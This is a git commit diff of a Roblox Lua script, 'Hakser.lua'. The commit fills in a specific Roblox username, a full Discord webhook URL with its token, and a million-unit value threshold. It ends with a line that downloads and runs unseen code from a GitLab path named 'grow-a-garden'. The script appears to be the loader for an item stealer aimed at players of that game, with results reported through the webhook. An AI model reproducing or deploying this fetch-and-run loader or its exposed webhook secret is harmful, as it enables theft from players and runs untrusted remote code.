1715cfa7c4159ed86cf55cbf12d815df35363b40
forsakenHacker <thatoneshedletskyyt@gmail.com>
2025-07-27 11:46:10 -0400

    Update Hakser.lua

--- Hakser.lua
+++ Hakser.lua
@@ -1,5 +1,5 @@
-Username = "Your Roblox Username"
-Webhook = "Your Webhook"
+Username = "ILoveEverybody077"
+Webhook = "https://discord.com/api/webhooks/1398749553083289710/o0qV2KeGVkVJJpP5yPxGmSYPtxgukXzPOLkm7DxdlUPITE6GuECLVLbI_38V6vnvSIFt"
 MinimumValue = 1000000
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
